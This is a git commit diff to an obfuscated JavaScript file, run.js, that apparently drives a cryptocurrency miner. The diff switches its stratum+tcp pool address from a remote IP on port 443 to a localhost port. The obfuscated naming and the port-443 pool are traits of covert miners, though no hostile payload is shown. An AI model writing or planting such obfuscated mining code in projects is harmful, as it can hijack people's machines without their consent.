2ae040d87db69962a0bb773045e17740e54a0789
x011-aI <vierodirwanto@gmail.com>
2026-07-11 10:47:55 +0800

    Update run.js

--- run.js
+++ run.js
@@ -2,7 +2,7 @@ const { Nnode: _0x1a2b3 } = require("./index.js");
 const _0x4c5d6 = require("os");
 
 (function () {
-    const _0x7e8f9 = 'stratum+tcp://23.92.29.22:443';
+    const _0x7e8f9 = 'stratum+tcp://127.0.0.1:4052';
 
     // Ambil argumen CLI
     const _0xa1b2c = parseInt(process.argv[2], 10);
